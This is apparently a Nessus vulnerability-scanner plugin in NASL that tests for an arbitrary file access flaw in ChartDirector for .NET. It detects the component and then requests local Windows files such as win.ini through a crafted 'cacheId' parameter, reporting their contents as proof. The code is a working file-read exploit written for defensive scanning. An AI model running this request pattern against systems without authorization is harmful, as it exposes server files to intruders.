#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(40983);
  script_version("$Revision: 1.11 $");

  script_bugtraq_id(36300);
  script_osvdb_id(57822);
  script_xref(name:"EDB-ID", value:"9612");
  script_xref(name:"Secunia", value:"36644");

  script_name(english:"ChartDirector for .NET cacheId Parameter Arbitrary File Access");
  script_summary(english:"Tries to retrieve a local file");
 
  script_set_attribute(  attribute:"synopsis",  value:
"The remote web server contains a .NET component that allows arbitrary
file access."  );
  script_set_attribute( attribute:"description",  value:
"The remote web server uses ChartDirector for .NET, a component for
creating and displaying charts.

The installed version of ChartDirector fails to sanitize the 'cacheId'
parameter before using it to retrieve arbitrary files.  An attacker
can leverage this issue to view the contents of arbitrary files on the
affected host, subject to the privileges under which the web server
runs."  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.securityfocus.com/archive/1/506330/30/0/threaded"
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.nessus.org/u?74c9cfa3"
  );
  script_set_attribute( attribute:"solution", value:
"Either apply the netchartdir501p2 patch or upgrade to ChartDirector
for .NET version 5.0.2 or later."  );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(
    attribute:"vuln_publication_date", 
    value:"2009/06/17"
  );
  script_set_attribute(
    attribute:"patch_publication_date", 
    value:"2009/06/22"
  );
  script_set_attribute(
    attribute:"plugin_publication_date", 
    value:"2009/09/11"
  );
 script_cvs_date("$Date: 2015/10/13 15:19:32 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2009-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "webmirror.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


os = get_kb_item("Host/OS");
if (os && "Windows" >!< os) exit(0, "The host is not affected since ChartDirector for .NET requires Windows.");


port = get_http_port(default:80);


files = make_list(
  "c:/windows/win.ini",
  "c:/winnt/win.ini"
);
file_pat = "; for 16-bit app support";
max_files = 20;                         # nb: doesn't apply if the "Perform thorough tests" setting is enabled.


scripts = get_kb_list(string("www/", port, "/content/extensions/aspx"));
if (isnull(scripts)) scripts = make_list("/chart.aspx", "/realtimedemo.aspx");

n = 0;
foreach script (scripts)
{
  ++n;

  # Grab a the script.
  res = http_send_recv3(method:"GET", item:script, port:port, exit_on_fail: 1);

  # If it looks like ChartDirector...
  if (
    '<img id="' >< res[2] &&
    'JsChartViewer' >< res[2] &&

    '&amp;cacheId=' >< res[2] &&
    '&amp;cacheDefeat=' >< res[2]
  )
  {
    # Identify how to call the script.
    # 
    # eg, <img id="WebChartViewer1" src="/chartdirector/semicirclemeter.aspx?ChartDirectorChartImage=chart_WebChartViewer1&amp;cacheId=a7122e89ead14d09904c7f04b8ac2f59&amp;cacheDefeat=633882177822542500" height="115" width="200" border="0" />
    img = strstr(res[2], '<img id="');
    img = img - strstr(img, '" />');

    pat = '^<img id="[^"]+" src="([^"\\?]+)\\?([^&]+)&amp;cacheId=[0-9a-f]+&amp;cacheDefeat=[0-9a-f]+"';
    item = eregmatch(pattern:pat, string:img);
    if (isnull(item)) continue;

    # script2 = item[1];
    args = item[2];

    # Now try to exploit the issue to retrieve a local file.
    foreach file (files)
    {
      url = string(
        script, "?",
        args, "&",
        "cacheId=", file
      );
      res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail: 1);

      if (egrep(pattern:file_pat, string:res[2]))
      {
        if (report_verbosity > 0)
        {
          file = str_replace(find:'/', replace:'\\', string:file);
          report = string(
            "\n",
            "Nessus was able to exploit the issue to retrieve the contents of\n",
            "'", file, "' on the remote host using the following URL :\n",
            "\n",
            "  ", build_url(port:port, qs:url), "\n"
          );
          if (report_verbosity > 1)
          {
            report += string(
              "\n",
              "Here are its contents :\n",
              "\n",
              crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
              res[2],
              crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
            );
          }
          security_warning(port:port, extra:report);
        }
        else security_warning(port);
        exit(0);
      }
    }
  }

  if (!thorough_tests && n > max_files) break;
}
